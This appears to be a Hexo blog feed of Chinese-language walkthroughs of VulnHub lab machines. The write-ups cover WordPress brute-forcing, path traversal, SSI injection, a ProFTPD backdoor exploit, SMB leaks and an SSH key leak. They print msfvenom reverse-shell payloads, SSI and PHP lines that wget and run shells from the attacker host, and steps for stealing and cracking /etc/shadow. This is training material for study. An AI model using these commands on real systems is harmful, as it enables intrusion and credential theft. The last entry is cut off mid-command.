href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实战第一章-暴力破解实战</title>
      <link href="/2022/04/24/marlinspike/"/>
      <url>/2022/04/24/marlinspike/</url>
      
        <content type="html"><![CDATA[<h1 id="综合实战第一章"><a href="#综合实战第一章" class="headerlink" title="综合实战第一章"></a>综合实战第一章</h1><h2 id="暴力破解实战"><a href="#暴力破解实战" class="headerlink" title="暴力破解实战"></a>暴力破解实战</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>攻击机:kali 192.168.3.134</p><p>靶机:marlinspike 192.168.3.157</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>老规矩</p><pre class=" language-Linux"><code class="language-Linux">nmap -sT 192.168.3.0/24</code></pre><p><img src="/2022/04/24/marlinspike/image-20220424211935950.png" alt="image-20220424211935950"></p><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.157</code></pre><p><img src="/2022/04/24/marlinspike/image-20220424212102509.png" alt="image-20220424212102509"></p><p>咱们看看80端口</p><p><img src="/2022/04/24/marlinspike/image-20220424212209073.png" alt="image-20220424212209073"></p><p>啥也没有，啥也不是</p><p>用nikto扫描一下</p><pre class=" language-Linux"><code class="language-Linux">nikto -h http://192.168.3.157</code></pre><p><img src="/2022/04/24/marlinspike/image-20220424212453005.png" alt="image-20220424212453005"></p><p>ok在浏览器里看一看</p><p><img src="/2022/04/24/marlinspike/image-20220424212609235.png" alt="image-20220424212609235"></p><p>一看，是wordpress 做的，有搞头了</p><p>wordpress默认后台登录地址是<code>/wp-login.php</code></p><p><img src="/2022/04/24/marlinspike/image-20220425080347793.png" alt="image-20220425080347793"></p><h3 id="尝试暴力破解"><a href="#尝试暴力破解" class="headerlink" title="尝试暴力破解"></a>尝试暴力破解</h3><p>在命令行界面</p><pre class=" language-Linux"><code class="language-Linux">msfconsoleuse auxiliary/scanner/http/wordpress_login_enumset username admin //wordpress默认用户是admin</code></pre><p>还需要加一个字典</p><pre class=" language-Linux"><code class="language-Linux">set pass_file usr/share/wordlists/dirb/common.txtset fargeturi http://192.168.3.157/set rhost 192.168.3.157run</code></pre><p><img src="/2022/04/24/marlinspike/image-20220425082015316.png" alt="image-20220425082015316"></p><p>不好使，还是用burpsuite吧</p><p>暴力破解出密码也是admin，登录网站</p><h3 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h3><p>然后就是在404里面写入木马了</p><p>构造webshell</p><pre class=" language-Linux"><code class="language-Linux">msfvenom -p php/meterpreter/reverse_tcp lhost= 192.168.3.134 lport=4444 -f raw > /root/msfshell.php</code></pre><p>打开msf</p><pre class=" language-Linux"><code class="language-Linux">msfconsoleuse exploit/multi/handlerset payload php/meterpreter/reverse_tcpset lhost 192.168.3.134set lport 4444</code></pre><p>把构造好的木马复制粘贴进文件里面</p><p><img src="/2022/04/24/marlinspike/image-20220425104228021.png" alt="image-20220425104228021"></p><p>上传上去之后执行404.php</p><pre class=" language-base"><code class="language-base">/wp-content/themes/twentyseventeen/404.php</code></pre><p><img src="/2022/04/24/marlinspike/image-20220425105039512.png" alt="image-20220425105039512"></p><p>连上了</p><p>可以下载文件</p><pre class=" language-Linux"><code class="language-Linux">download /etc/passwddownload /etc/shadow</code></pre><p>看一眼奥</p><p><img src="/2022/04/24/marlinspike/image-20220425105336437.png" alt="image-20220425105336437"></p><p>把shadow和passwd这俩文件合并起来</p><pre class=" language-Linux"><code class="language-Linux">unshadow passwd shadow > crack</code></pre><p>然后就可以用john破解密码了</p><pre class=" language-Linux"><code class="language-Linux">john crack</code></pre><p><img src="/2022/04/24/marlinspike/image-20220425105726726.png" alt="image-20220425105726726"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>剩下的就是快乐的提权了</p><pre class=" language-Linux"><code class="language-Linux">shellpython -c 'import pty;pty.spawn("/bin/bash")'</code></pre><p>先登录用户</p><pre class=" language-Linux"><code class="language-Linux">su - marlinspike</code></pre><p><img src="/2022/04/24/marlinspike/image-20220425110053867.png" alt="image-20220425110053867"></p><p>查看一下权限</p><pre class=" language-Linux"><code class="language-Linux">sudo -l</code></pre><p><img src="/2022/04/24/marlinspike/image-20220425110146730.png" alt="image-20220425110146730"></p><p>三个ALL，可以直接提权到root</p><pre class=" language-Linux"><code class="language-Linux">sudo su</code></pre><p><img src="/2022/04/24/marlinspike/image-20220425110701441.png" alt="image-20220425110701441"></p><p>成了，结束！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实战第一章-路径遍历实战</title>
      <link href="/2022/04/24/zico2/"/>
      <url>/2022/04/24/zico2/</url>
      
        <content type="html"><![CDATA[<h1 id="综合实战第一章"><a href="#综合实战第一章" class="headerlink" title="综合实战第一章"></a>综合实战第一章</h1><h2 id="路径遍历实战"><a href="#路径遍历实战" class="headerlink" title="路径遍历实战"></a>路径遍历实战</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>本次环境使用的是vulnhub靶场里面的zico2</p><p>靶场下载地址：<a href="https://download.vulnhub.com/zico/zico2.ova">https :&#x2F;&#x2F;download.vulnhub.com&#x2F;zico&#x2F;zico2.ova</a></p><p>靶机：192.168.3.156</p><p>攻击机:kali 192.168.3.134</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>还是熟悉的信息搜集</p><pre class=" language-Linux"><code class="language-Linux">nmap -sT 192.168.3.0/24</code></pre><p><img src="/2022/04/24/zico2/image-20220424194143317.png" alt="image-20220424194143317"></p><p>详细点</p><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.156</code></pre><p><img src="/2022/04/24/zico2/image-20220424194310135.png" alt="image-20220424194310135"></p><p>既然80开了，那就访问看看</p><p><img src="/2022/04/24/zico2/image-20220424194417503.png" alt="image-20220424194417503"></p><p>好像是个博客？用nikto扫一下</p><pre class=" language-Linux"><code class="language-Linux">nikto -h http://192.168.3.156</code></pre><p><img src="/2022/04/24/zico2/image-20220424194715685.png" alt="image-20220424194715685"></p><p>再用dirb扫一下</p><pre class=" language-Linux"><code class="language-Linux">dirb http://192.168.3.156</code></pre><p><img src="/2022/04/24/zico2/image-20220424194757104.png" alt="image-20220424194757104"></p><p>打眼一看，有个dbadmin，进去看看</p><p><img src="/2022/04/24/zico2/image-20220424194919030.png" alt="image-20220424194919030"></p><p>有个<code>test_db.php</code>，再点进去</p><p><img src="/2022/04/24/zico2/image-20220424194953275.png" alt="image-20220424194953275"></p><p>一个登录窗口，我们再看看有没有啥别的玩意,找了确实啥也没有</p><p>搜索了一下phpliteadmin的默认密码，是<code>admin</code>,尝试登录</p><p><img src="/2022/04/24/zico2/image-20220424195150526.png" alt="image-20220424195150526"></p><p>进去了，先放着</p><p>打开<code>owasp zap</code></p><blockquote><p>OWASP Zed攻击代理（ZAP）是世界上最受欢迎的免费安全审计工具之一，<br>由数百名国际志愿者*积极维护。<br>它可以帮助您在开发和测试应用程序时自动查找Web应用程序中的安全漏洞。</p></blockquote><p><img src="/2022/04/24/zico2/image-20220424201006273.png" alt="image-20220424201006273"></p><p><img src="/2022/04/24/zico2/image-20220424201039942.png" alt="image-20220424201039942"></p><p><img src="/2022/04/24/zico2/image-20220424201215029.png" alt="image-20220424201215029"></p><p>然后把他扔到浏览器里，发现了好东西</p><p><img src="/2022/04/24/zico2/image-20220424201310663.png" alt="image-20220424201310663"></p><p>发现这是个目录遍历漏洞</p><p><img src="/2022/04/24/zico2/image-20220424201408309.png" alt="image-20220424201408309"></p><h3 id="构造webshell"><a href="#构造webshell" class="headerlink" title="构造webshell"></a>构造webshell</h3><p>在网页里新建一个shell.php</p><p><img src="/2022/04/24/zico2/image-20220424201548792.png" alt="image-20220424201548792"></p><p>新建一个表</p><p><img src="/2022/04/24/zico2/image-20220424201630483.png" alt="image-20220424201630483"></p><p>在表里插入一个列</p><p><img src="/2022/04/24/zico2/image-20220424201716932.png" alt="image-20220424201716932"></p><p>然后在列里插入数据</p><p>使用weevely新建木马</p><pre class=" language-Linux"><code class="language-Linux">weevely generate 123456 /root/shell.php</code></pre><h3 id="利用webshell"><a href="#利用webshell" class="headerlink" title="利用webshell"></a>利用webshell</h3><p>构造字段参数</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span>"cd <span class="token operator">/</span>tmp<span class="token punctuation">;</span>wget http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//192.168.3.134:8000/shell.php;chmod + x shell.php;");?></span></code></pre><p>插入</p><p><img src="/2022/04/24/zico2/image-20220424203010821.png" alt="image-20220424203010821"></p><p>再回到kali命令行</p><pre class=" language-Linux"><code class="language-Linux">python -m SimpleHTTPServer</code></pre><p><img src="/2022/04/24/zico2/image-20220424203118103.png" alt="image-20220424203118103"></p><pre class=" language-base"><code class="language-base">192.168.3.156/view.php?page=../../../../usr/databases/shell.php</code></pre><p>访问这个</p><p>下载shell</p><p><img src="/2022/04/24/zico2/image-20220424203555635.png" alt="image-20220424203555635"></p><p>然后浏览器访问<a href="http://192.168.3.156/view.php?page=../../../../tmp/shell.php">http://192.168.3.156/view.php?page=../../../../tmp/shell.php</a></p><p>在命令行里输入</p><pre class=" language-Linux"><code class="language-Linux">weevely http://192.168.3.156/view.php?page=../../../../tmp/shell.php 123456</code></pre><p><img src="/2022/04/24/zico2/image-20220424203837608.png" alt="image-20220424203837608"></p><p>成了</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实战第一章-SSI注入实战</title>
      <link href="/2022/04/24/SSI/"/>
      <url>/2022/04/24/SSI/</url>
      
        <content type="html"><![CDATA[<h1 id="综合实战第一章"><a href="#综合实战第一章" class="headerlink" title="综合实战第一章"></a>综合实战第一章</h1><h2 id="SSI注入实战"><a href="#SSI注入实战" class="headerlink" title="SSI注入实战"></a>SSI注入实战</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>靶机ip：192.168.3.155</p><p>攻击机ip：192.168.3.134</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>老规矩，使用nmap搜集信息</p><pre class=" language-Linux"><code class="language-Linux">nmap -sT 192.168.3.0/24</code></pre><p><img src="/2022/04/24/SSI/image-20220424152955834.png" alt="image-20220424152955834"></p><p>往详细挖一下</p><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.155</code></pre><p><img src="/2022/04/24/SSI/image-20220424153223283.png" alt="image-20220424153223283"></p><p>去看一眼80端口</p><p><img src="/2022/04/24/SSI/image-20220424153344663.png" alt="image-20220424153344663"></p><p><img src="/2022/04/24/SSI/image-20220424153415352.png" alt="image-20220424153415352"></p><p>可以使用nikto网页扫描工具扫一下这个网页</p><pre class=" language-Linux"><code class="language-Linux">nikto -h http://192.168.3.155</code></pre><p>找到一个奇怪的敏感文件<code>/spukcab/</code></p><p><img src="/2022/04/24/SSI/image-20220424153901161.png" alt="image-20220424153901161"></p><p>ok进去看看，发现好像是备份文件</p><p><img src="/2022/04/24/SSI/image-20220424154008211.png" alt="image-20220424154008211"></p><p>把这俩文件下载下来看看</p><p>发现是配置文件和网页源代码，先不管看看别的</p><p><img src="/2022/04/24/SSI/image-20220424154407647.png" alt="image-20220424154407647"></p><p>没啥东西，再找别的，看一下主页面的源代码</p><p><img src="/2022/04/24/SSI/image-20220424154633002.png" alt="image-20220424154633002"></p><p>抓个包看看去</p><p>打开burpsuite</p><p><img src="/2022/04/24/SSI/image-20220424155113716.png" alt="image-20220424155113716"></p><p>点击<code>send to Repeater</code>看看回显</p><p><img src="/2022/04/24/SSI/image-20220424155238373.png" alt="image-20220424155238373"></p><p>啥也没有，啥也不是</p><h3 id="SSI注入利用"><a href="#SSI注入利用" class="headerlink" title="SSI注入利用"></a>SSI注入利用</h3><blockquote><p>ssi全称server side inject</p><p>如果发现了shtml stm shtm都有可能出现SSI注入</p></blockquote><p>注入语句</p><pre class=" language-css"><code class="language-css">&lt;!--#exec cmd=<span class="token string">"cat /etc/passwd"</span> -->&lt;!--#include virtual=<span class="token string">"/wwwroot/xxx.html"</span> -->&lt;!--#echo var=<span class="token string">"REMOTE_ADDR"</span> --></code></pre><p>在主页面尝试注入</p><p><img src="/2022/04/24/SSI/image-20220424155631755.png" alt="image-20220424155631755"></p><p>可能是过滤了，大小写转换试试</p><p><img src="/2022/04/24/SSI/image-20220424155720771.png" alt="image-20220424155720771"></p><p>出来了</p><h3 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h3><h4 id="制作webshell"><a href="#制作webshell" class="headerlink" title="制作webshell"></a>制作webshell</h4><pre class=" language-Linux"><code class="language-Linux">msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.3.134 lport=4444 -f raw > shell.py</code></pre><p>打开msf</p><pre class=" language-Linux"><code class="language-Linux">msfconsoleuse exploit/multi/handlerset payload python/meterpreter/reverse_tcpset lhost 192.168.3.134set lport 4444exploit</code></pre><p>自己打开apache服务，然后把制作的东西扔进var&#x2F;www&#x2F;html里</p><p>准备构造上传语句</p><pre class=" language-css"><code class="language-css">&lt;!--#EXEC cmd=<span class="token string">"wget http://192.168.3.134/shell.py"</span>--></code></pre><p><img src="/2022/04/24/SSI/image-20220424161948148.png" alt="image-20220424161948148"></p><p>给传上去的东西提权</p><pre class=" language-css"><code class="language-css">&lt;!--#EXEC cmd=<span class="token string">"chmod 777 shell.py"</span>--></code></pre><p>调用</p><pre class=" language-css"><code class="language-css">&lt;!--#EXEC cmd=<span class="token string">"python shell.py"</span>--></code></pre><p><img src="/2022/04/24/SSI/image-20220424162024724.png" alt="image-20220424162024724"></p><p>成了</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实战第一章-ftp系实战</title>
      <link href="/2022/04/24/proftpd/"/>
      <url>/2022/04/24/proftpd/</url>
      
        <content type="html"><![CDATA[<h1 id="综合实战第一章"><a href="#综合实战第一章" class="headerlink" title="综合实战第一章"></a>综合实战第一章</h1><h2 id="ftp系实战"><a href="#ftp系实战" class="headerlink" title="ftp系实战"></a>ftp系实战</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>靶场下载：<a href="https://www.vulnhub.com/entry/basic-pentesting-1,216/">https://www.vulnhub.com/entry/basic-pentesting-1,216/</a></p><p>攻击机:</p><p>kali 192.168.3.134</p><p>win7 192.168.3.137</p><p>靶机:BASIC_PENTESTING_1 192.168.3.174</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>nmap扫描</p><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.174</code></pre><p><img src="/2022/04/24/proftpd/image-20220508161830087.png" alt="image-20220508161830087"></p><p>发现有21,22,80端口</p><p>看到了proftpd，可以看看有没有现成漏洞</p><p>搜索漏洞库</p><pre class=" language-Linux"><code class="language-Linux">searchsploit ProFTPD 1.3.3c</code></pre><p><img src="/2022/04/24/proftpd/image-20220508161932988.png" alt="image-20220508161932988"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>打开msf，搜索相关漏洞</p><pre class=" language-Linux"><code class="language-Linux">msfconsolesearch ProFTPD 1.3.3c</code></pre><p><img src="/2022/04/24/proftpd/image-20220508162233320.png" alt="image-20220508162233320"></p><p>看到有个后门漏洞</p><p>使用这玩意</p><pre class=" language-Linux"><code class="language-Linux">use exploit/unix/ftp/proftpd_133c_backdoorshow options</code></pre><p><img src="/2022/04/24/proftpd/image-20220508162636364.png" alt="image-20220508162636364"></p><p>设置参数</p><pre class=" language-Linux"><code class="language-Linux">set rhosts 192.168.3.174</code></pre><p>修改payload</p><pre class=" language-Linux"><code class="language-Linux">set payload cmd/unix/reverseset lhost 192.168.3.134exploit</code></pre><p><img src="/2022/04/24/proftpd/image-20220508163332502.png" alt="image-20220508163332502"></p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/05/13/Vulnstack-ATT-CK-1/">Vulnstack红日内网渗透靶场1实战</a></li><li><a href="http://broken-year.github.io/2022/05/03/theEther/">综合实战第三章-日志注入实战</a></li><li><a href="http://broken-year.github.io/2022/05/03/DomDom/">综合实战第三章-特殊抓包实战</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
            <tag> FTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实战第一章-smb信息泄露实战</title>
      <link href="/2022/04/23/Lazysysadmin/"/>
      <url>/2022/04/23/Lazysysadmin/</url>
      
        <content type="html"><![CDATA[<h1 id="综合实战第一章"><a href="#综合实战第一章" class="headerlink" title="综合实战第一章"></a>综合实战第一章</h1><h2 id="smb信息泄露实战"><a href="#smb信息泄露实战" class="headerlink" title="smb信息泄露实战"></a>smb信息泄露实战</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>本次环境使用的是vulnhub靶场里面的Lazysysadmin</p><p>靶场地址:<a href="https://www.vulnhub.com/entry/lazysysadmin-1,205/">https://www.vulnhub.com/entry/lazysysadmin-1,205/</a></p><p>攻击机:kali 192.168.3.134</p><p>靶机:lazysysadmin 192.168.3.153</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>先确定目标靶机</p><p>扫描整个网段</p><pre class=" language-Linux"><code class="language-Linux">nmap -sT 192.168.3.0/24</code></pre><p><img src="/2022/04/23/Lazysysadmin/image-20220423131933646.png" alt="image-20220423131933646"></p><p>找到目标靶机ip，顺便知道开放22,80,139,445,3306,6667端口</p><p><img src="/2022/04/23/Lazysysadmin/image-20220423132130915.png" alt="image-20220423132130915"></p><p>尝试使用空口令登录</p><pre class=" language-Linux"><code class="language-Linux">smbclient -L 192.168.3.153</code></pre><p><img src="/2022/04/23/Lazysysadmin/image-20220423132518590.png" alt="image-20220423132518590"></p><p>发现三个文件</p><blockquote><p>print$    共享驱动</p><p>share$    共享文件夹</p><p>IPC$    共享空连接，不需要用户名就能登录的web服务器</p></blockquote><p>查看共享文件夹里的内容</p><pre class=" language-Linux"><code class="language-Linux">smbclient '\\192.168.3.153\share$'</code></pre><p><img src="/2022/04/23/Lazysysadmin/image-20220423132821489.png" alt="image-20220423132821489"></p><p>可以通过get把里面的文件下载下来</p><pre class=" language-Linux"><code class="language-Linux">get deets.txt</code></pre><p>里面有个不知道是谁的密码，先记下来</p><p><img src="/2022/04/23/Lazysysadmin/image-20220423134011727.png" alt="image-20220423134011727"></p><p>然后看这个文件夹像是网站目录，wordpress里的配置文件名称是<code>wp-config.php</code></p><p>配置文件里发现了数据库信息</p><p><img src="/2022/04/23/Lazysysadmin/image-20220423134105810.png" alt="image-20220423134105810"></p><p>这些还不知道怎么用，先放着，打开192.168.3.153查看网站</p><p><img src="/2022/04/23/Lazysysadmin/image-20220423141913498.png" alt="image-20220423141913498"></p><p>没啥东西</p><p>用dirb进行扫描</p><pre class=" language-Linux"><code class="language-Linux">dirb http://192.168.3.153</code></pre><p><img src="/2022/04/23/Lazysysadmin/image-20220423142433570.png" alt="image-20220423142433570"></p><p>发现敏感目录，打开看看</p><p><img src="/2022/04/23/Lazysysadmin/image-20220423142601072.png" alt="image-20220423142601072"></p><p>用前面wp-config.php中的账号和密码输入进去看看</p><p><img src="/2022/04/23/Lazysysadmin/image-20220423142704975.png" alt="image-20220423142704975"></p><p>进去了</p><h3 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h3><p>上传点theme 404.php</p><p><img src="/2022/04/23/Lazysysadmin/image-20220423143011275.png" alt="image-20220423143011275"></p><p>构造payload</p><pre class=" language-Linux"><code class="language-Linux">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.3.134 lport=4444 -f raw > /root/shell.php</code></pre><p>然后打开msf</p><pre class=" language-Linux"><code class="language-Linux">msfconsoleuse exploit/multi/handlerset payload php/meterpreter/reverse_tcpset lhost 192.168.3.134set lport 4444exploit</code></pre><p><img src="/2022/04/23/Lazysysadmin/image-20220423143727513.png" alt="image-20220423143727513"></p><p>然后把之前构造好的payload复制到404那里面</p><p><img src="/2022/04/23/Lazysysadmin/image-20220423143924074.png" alt="image-20220423143924074"></p><p>然后访问<a href="http://192.168.3.153/wordpress/wp-content/themes/twentyfifteen/404.php">http://192.168.3.153/wordpress/wp-content/themes/twentyfifteen/404.php</a></p><p><code>ps:</code>themes后面的东西根据这个来<img src="/2022/04/23/Lazysysadmin/image-20220423144706953.png" alt="image-20220423144706953"></p><p>执行shell</p><p><img src="/2022/04/23/Lazysysadmin/image-20220423144838134.png" alt="image-20220423144838134"></p><p>可以整成好看点的样子</p><pre class=" language-Linux"><code class="language-Linux">python -c 'import pty;pty.spawn("/bin/bash")'cat /etc/passwd 查看一下账户信息</code></pre><p><img src="/2022/04/23/Lazysysadmin/image-20220423145033198.png" alt="image-20220423145033198"></p><p><img src="/2022/04/23/Lazysysadmin/image-20220423145215014.png" alt="image-20220423145215014"></p><p>找到一个用户，此时上面好像有个密码还没用到，可恶意提权试试</p><pre class=" language-Linux"><code class="language-Linux">su togie</code></pre><p><img src="/2022/04/23/Lazysysadmin/image-20220423145823737.png" alt="image-20220423145823737"></p><p>成功进入</p><p>尝试提权</p><pre class=" language-Linux"><code class="language-Linux">sudo -l</code></pre><p><img src="/2022/04/23/Lazysysadmin/image-20220423150007459.png" alt="image-20220423150007459"></p><p>发现可以执行啥</p><pre class=" language-Linux"><code class="language-Linux">sudo su提权到root</code></pre><p><img src="/2022/04/23/Lazysysadmin/image-20220423150146571.png" alt="image-20220423150146571"></p><p>完事</p><p><img src="/2022/04/23/Lazysysadmin/image-20220423150221240.png" alt="image-20220423150221240"></p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实战第一章-私钥泄露实战</title>
      <link href="/2022/04/23/covfefe/"/>
      <url>/2022/04/23/covfefe/</url>
      
        <content type="html"><![CDATA[<h1 id="综合实战第一章"><a href="#综合实战第一章" class="headerlink" title="综合实战第一章"></a>综合实战第一章</h1><h2 id="私钥泄露实战"><a href="#私钥泄露实战" class="headerlink" title="私钥泄露实战"></a>私钥泄露实战</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>本次环境使用的是vulnhub靶场里面的covfefe</p><p>靶场下载地址:<a href="https://www.vulnhub.com/entry/covfefe-1,199/">https://www.vulnhub.com/entry/covfefe-1,199/</a></p><p>攻击机:kali 192.168.3.134</p><p>靶机:covfefe 192.168.3.152</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>先确定目标靶机</p><p>扫描整个网段</p><pre class=" language-Linux"><code class="language-Linux">nmap -sT 192.168.3.0/24</code></pre><p><img src="/2022/04/23/covfefe/image-20220423102139037.png" alt="image-20220423102139037"></p><p>找到目标，发现有三个端口，22 80 31337</p><p><img src="/2022/04/23/covfefe/image-20220423102356900.png" alt="image-20220423102356900"></p><p>先访问80端口</p><p><img src="/2022/04/23/covfefe/image-20220423102552747.png" alt="image-20220423102552747"></p><p>没啥东西，访问31337端口尝试一下</p><p><img src="/2022/04/23/covfefe/image-20220423102623508.png" alt="image-20220423102623508"></p><p>啥也没有，使用工具dirb扫描一下</p><blockquote><p>DIRB是一个Web内容扫描程序。它查找现有的（和&#x2F;或隐藏的）Web对象。它基本上是通过对Web服务器发起基于字典的攻击并分析响应来工作的。 </p></blockquote><pre class=" language-Linux"><code class="language-Linux">dirb http://192.168.3.152:31337</code></pre><p><img src="/2022/04/23/covfefe/image-20220423102857109.png" alt="image-20220423102857109"></p><p>打开robots.txt 查看一下</p><p><img src="/2022/04/23/covfefe/image-20220423103031949.png" alt="image-20220423103031949"></p><p>访问一下&#x2F;taxes</p><p><img src="/2022/04/23/covfefe/image-20220423103110390.png" alt="image-20220423103110390"></p><p>第一个flag就得到了</p><h3 id="ssh私钥登录"><a href="#ssh私钥登录" class="headerlink" title="ssh私钥登录"></a>ssh私钥登录</h3><p>访问.ssh文件</p><p><img src="/2022/04/23/covfefe/image-20220423103429107.png" alt="image-20220423103429107"></p><p>说明私钥泄露了</p><p>然后把这三个文件下载下来</p><pre class=" language-base"><code class="language-base">/.ssh/id_rsa    /.ssh/authorized_keys   /.ssh/id_rsa.pub</code></pre><p><img src="/2022/04/23/covfefe/image-20220423103643168.png" alt="image-20220423103643168"></p><p>给这三个文件加点权限</p><pre class=" language-Linux"><code class="language-Linux">chmod 600 